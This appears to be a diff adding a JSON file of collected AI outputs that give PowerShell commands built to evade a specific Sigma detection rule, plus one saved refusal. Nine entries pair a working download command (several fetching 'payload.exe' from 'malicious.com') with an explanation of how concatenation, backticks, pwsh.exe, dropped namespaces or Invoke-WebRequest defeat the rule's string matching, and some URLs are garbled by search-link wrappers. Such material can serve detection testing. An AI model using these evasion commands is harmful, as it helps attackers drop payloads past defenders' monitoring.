@@ -1,0 +1,42 @@
+[
+  {
+    "output": "powershell.exe -Command \"$wc = New-Object ('System.N' + 'et.WebClient'); $wc.DownloadFile('[http://example.com/test.txt](https://www.google.com/search?q=http://example.com/test.txt)', 'C:\\test.txt')\"",
+    "explanation": "The Sigma rule relies on exact string matching for all three terms. By splitting the string 'System.Net.WebClient' using PowerShell string concatenation, the literal string is removed from the command line, causing the 'contains|all' condition to fail."
+  },
+  {
+    "output": "powershell.exe -Command \"$client = New-Object System.Net.WebClient; $method = 'Download' + 'File'; $client.$method('[http://example.com/test.txt](https://www.google.com/search?q=http://example.com/test.txt)', 'C:\\test.txt')\"",
+    "explanation": "This command dynamically constructs the method name 'DownloadFile' at runtime. Because the literal string '.DownloadFile' does not appear in the execution arguments, the static command line inspection of the Sigma rule is bypassed."
+  },
+  {
+    "output": "pwsh.exe -Command \"(New-Object System.Net.WebClient).DownloadFile('[http://example.com/test.txt](https://www.google.com/search?q=http://example.com/test.txt)', 'C:\\test.txt')\"",
+    "explanation": "The rule explicitly looks for the string 'powershell'. By executing the command using 'pwsh.exe' (the executable for PowerShell Core 6+), the first required string condition is not met, evading detection."
+  },
+  {
+    "output": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://malicious.com/payload.exe', 'C:\\payload.exe')\"",
+    "explanation": "PowerShell allows instantiating the WebClient object without explicitly declaring the 'System.' namespace. By using 'Net.WebClient', the strict string match for 'System.Net.WebClient' in the selection block evaluates to false, bypassing the rule while maintaining the exact same functionality."
+  },
+  {
+    "output": "pwsh.exe -Command \"(New-Object System.Net.WebClient).DownloadFile('http://malicious.com/file.exe', 'C:\\file.exe')\"",
+    "explanation": "The rule explicitly requires the presence of the exact string 'powershell'. Executing the malicious download command using PowerShell Core's default executable name ('pwsh.exe') completely circumvents the 'powershell' keyword condition."
+  },
+  {
+    "output": "powershell.exe -c \"Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\\payload.exe'\"",
+    "explanation": "By leveraging native PowerShell cmdlets like Invoke-WebRequest instead of interacting with the .NET WebClient class, the required substrings '.DownloadFile' and 'System.Net.WebClient' are completely avoided, achieving the same execution objective."
+  },
+  {
+    "output": "powershell.exe -Command \"(New-Object Net.WebClient).DownloadFile('[http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)', 'C:\\Temp\\payload.exe')\"",
+    "explanation": "The Sigma rule requires all three strings to be present: 'powershell', '.DownloadFile', and 'System.Net.WebClient'. By omitting the 'System.' namespace and invoking just 'Net.WebClient', PowerShell still successfully resolves the object, but the exact string match for 'System.Net.WebClient' fails, bypassing the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"(New-Object System.Net.Web`Client).Down`loadFile('[http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)', 'C:\\Temp\\payload.exe')\"",
+    "explanation": "PowerShell allows the use of backticks (`) as escape characters without affecting the execution of commands. Inserting backticks inside the method or class names breaks the SIEM's literal string matching for '.DownloadFile' and 'System.Net.WebClient'."
+  },
+  {
+    "output": "powershell.exe -Command \"$wc = New-Object System.Net.WebClient; $method = 'Download' + 'File'; $wc.$method.Invoke('[http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe)', 'C:\\Temp\\payload.exe')\"",
+    "explanation": "Bypasses the rule by concatenating the string 'Download' and 'File' at runtime and invoking it dynamically. The command line contains 'powershell' and 'System.Net.WebClient', but completely avoids the literal string '.DownloadFile'."
+  },
+  {
+    "output": "Sorry, I cannot generate commands or requests designed to bypass specific security detection rules. I can, however, explain the logic of this Sigma rule, discuss general obfuscation concepts it might miss, or suggest ways to improve its robustness.",
+    "explanation": "Raw gemini-browser output saved because JSON parse failed: Response does not contain a complete bypass JSON array/object: Expecting value: line 1 column 1 (char 0)"
+  }
+]
